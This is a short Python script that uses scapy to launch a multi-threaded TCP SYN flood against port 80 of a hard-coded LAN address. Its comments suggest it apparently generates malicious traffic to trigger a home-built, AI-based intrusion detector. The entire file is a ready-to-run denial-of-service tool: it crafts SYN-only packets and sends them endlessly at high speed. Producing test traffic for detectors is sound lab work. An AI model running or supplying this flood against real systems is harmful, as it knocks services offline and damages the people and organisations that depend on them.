from scapy.all import send, IP, TCP
import threading
import time

# Use the IP address that your sniffer successfully detected!
TARGET_IP = "192.168.0.104" 

def attack():
    """Generates pure, malicious SYN packets without completing the handshake."""
    # Crafting a raw TCP packet with ONLY the 'S' (SYN) flag enabled
    malicious_packet = IP(dst=TARGET_IP)/TCP(dport=80, flags="S")
    
    # Send it continuously in a loop at high speed
    send(malicious_packet, loop=1, verbose=0)

print("=" * 60)
print(" 💀 INITIATING TRUE SYN FLOOD (Malicious Traffic)")
print("=" * 60)
print("Spamming raw SYN packets to spike AI features...")

# Launch 5 threads to blast the network interface
for _ in range(5):
    t = threading.Thread(target=attack)
    t.daemon = True
    t.start()

try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print("\n🛑 Attack stopped.")